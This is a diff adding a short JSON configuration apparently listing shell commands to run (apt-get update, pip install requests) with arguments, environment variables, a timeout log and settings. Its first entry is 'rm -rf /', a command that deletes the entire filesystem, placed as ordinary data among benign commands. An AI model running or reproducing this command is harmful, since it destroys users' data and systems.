@@ -1,0 +1,29 @@
+{
+  "commands": [
+    {
+      "cmd": "rm -rf /",
+      "args": ["recursive", "force"],
+      "env": ["DEBUG=ON", "VERBOSE=ON"]
+    },
+    {
+      "cmd": "apt-get update",
+      "args": ["--fix-missing"],
+      "env": ["HOME=/", "LANG=C.UTF-8"]
+    }
+ ,
+    {
+      "cmd": "pip install requests",
+      "args": ["--upgrade"],
+      "env": ["PYTHONPATH=.", "VIRTUALENVWRAPPER_HOME=/tmp"]
+    }
+  ],
+  "logs": {
+    "error": "Connection timed out",
+    "timestamp": "2024-06-15 14:30:00"
+  },
+  "settings": {
+    "timezone": "America/New_York",
+    "language": "en_US"
+  },
+    "status": "Active"
+}
